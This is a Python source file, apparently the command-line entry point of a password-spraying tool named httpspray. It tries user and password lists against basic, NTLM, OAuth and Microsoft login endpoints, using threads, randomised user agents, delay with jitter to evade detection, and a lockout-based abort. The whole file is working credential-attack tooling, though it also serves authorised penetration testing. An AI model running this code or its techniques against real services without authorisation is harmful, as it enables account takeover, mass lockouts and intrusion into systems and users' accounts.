from argparse import ArgumentParser, Namespace
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any, Generator
import csv
import itertools
import json
import random
import urllib.parse

from requests import Response
import requests
import urllib3
import urllib3.connection

from httpspray.module.basic import BasicSpray
from httpspray.module.msauth import MSAuthSpray
from httpspray.module.ntlm import NTLMSpray
from httpspray.module.oauth import OAuthSpray


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

AUTHENTICATION_METHODS = dict(basic=BasicSpray, ntlm=NTLMSpray, oauth=OAuthSpray, msauth=MSAuthSpray)


def uint(value: str) -> int:
    result = int(value)
    if result < 0:
        raise ValueError('invalid unsigned integer')
    return result


def main() -> None:
    entrypoint = ArgumentParser()
    entrypoint.add_argument('-t', '--target', type=urllib.parse.urlparse, required=True, metavar='URL')
    entrypoint.add_argument('-m', '--method', choices=tuple(AUTHENTICATION_METHODS), required=True, metavar='|'.join(AUTHENTICATION_METHODS))
    entrypoint.add_argument('--proxy', default=None, metavar='URL')
    entrypoint.add_argument('--threads', type=uint, default=1, metavar='UINT', help='Default: 1')
    entrypoint.add_argument('--delay', type=uint, default=0, metavar='SECONDS', help='Average delay between requests')
    entrypoint.add_argument('--jitter', type=uint, default=0, metavar='SECONDS', help='Randomizes delay between delay-jitter and delay+jitter')
    entrypoint.add_argument('--lock-treshold', type=int, default=10, metavar='UINT', help='Abort after N lockouts. Default: 10')
    group = entrypoint.add_argument_group('auth')
    group.add_argument('-u', '--user', action='append', default=[], metavar='USER|FILE')
    group.add_argument('-p', '--password', action='append', default=[], metavar='PASS|FILE')
    group.add_argument('-c', '--credential', action='append', default=[], metavar='USER:PASS|FILE')
    group.add_argument('--user-agent', action='append', default=[], metavar='STRING|FLIE')
    group = entrypoint.add_argument_group('oauth')
    group.add_argument('--client-id', action='append', default=[], metavar='UUID|FILE')
    group.add_argument('--resource', action='append', default=[], metavar='URL|FILE')
    group.add_argument('--scope', default='openid profile offline_access', metavar='STRING')

    opts = entrypoint.parse_args()

    if (not opts.user or not opts.password) and not opts.credential:
        print('error: users and passwords or credentials must be specified')
        print()
        entrypoint.print_help()
        exit(1)

    if opts.method in ('oauth', 'msauth') and (not opts.client_id or not opts.resource):
        print('error: oauth and msauth require --client-id and --resource')
        print()
        entrypoint.print_help()
        exit(1)

    if opts.jitter > opts.delay:
        print('error: delay must be larger than jitter')
        exit(1)

    if opts.user_agent:
        opts.user_agents = randomize(opts.user_agent)
    else:
        opts.user_agents = randomize(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6356.209 Safari/537.36'])
    if opts.client_id:
        opts.client_ids = randomize(opts.client_id)
    else:
        opts.client_ids = randomize([])
    if opts.resource:
        opts.resources = randomize(opts.resource)
    else:
        opts.resources = randomize([])

    cls = AUTHENTICATION_METHODS[opts.method]
    instance = cls(opts)
    try:
        response = instance.check()
        if response:
            log(response, status='error', message='initial check failed', headers=dict(response.headers))
            exit(1)
    except Exception as e:
            log_raw(status='error', mssage=str(e))
            exit(1)
    credentials = itertools.chain(
        (line.split(':', maxsplit=1) for line in generate(opts.credential)),
        ((username, password) for password in generate(opts.password) for username in generate(opts.user)),
    )
    lock_count = 0
    with ThreadPoolExecutor(max_workers=opts.threads) as pool:
        for response, result in pool.map(instance.spray, credentials):
            log(response, **result)
            if result['status'] == 'locked':
                lock_count = min(opts.lock_treshold, lock_count + 1)
            else:
                lock_count = max(0, lock_count - 1)
            if lock_count >= opts.lock_treshold:
                log_raw(status='error', message='aborted due to repeated lockouts')
                break


def generate(args: list[str]) -> list[str]:
    results = []
    for arg in args:
        path = Path(arg)
        if path.exists():
            if path.suffix == '.csv':
                with open(path) as file:
                    for row in csv.reader(file):
                        results.append(row[0])
            else:
                results.extend(line.rstrip() for line in path.read_text().splitlines())
        else:
            results.append(arg)
    return results


def randomize(args: list[str]) -> Generator[str, None, None]:
    values = generate(args)
    while True:
        yield random.choice(values)


def log(response: Response, *, status: str|None, message: str|None = None, **kwargs: Any) -> None:
    log_raw(status=status or 'unknown', message=message, **kwargs, status_code=response.status_code, size=len(response.content), time=response.elapsed.total_seconds())


def log_raw(**kwargs: Any) -> None:
    print(json.dumps(kwargs, separators=(',', ':')), flush=True)


# undo path normalization applied by requests and urllib3
# overwriting the 'url' attribute of a prepared request was not enough
# see https://github.com/psf/requests/issues/6115#issuecomment-1913102974

def _make_request(self: urllib3.connectionpool.HTTPConnectionPool, conn: urllib3.connection.HTTPConnection|urllib3.connection.HTTPSConnection, method: str, url: str, body: Any, headers: dict[str, str], **kwargs: Any):
    if 'X-HTTPSpray-Path' in headers:
        # headers is a reference to the global 'session.headers'
        headers = headers.copy()
        # overwrite request path with original path from internal header
        url = headers.pop('X-HTTPSpray-Path')
    function = getattr(self, '_original_make_request')
    return function(conn, method, url, body, headers, **kwargs)

setattr(urllib3.connectionpool.HTTPConnectionPool, '_original_make_request', urllib3.connectionpool.HTTPConnectionPool._make_request)
setattr(urllib3.connectionpool.HTTPConnectionPool, '_make_request', _make_request)


if __name__ == '__main__':
    main()
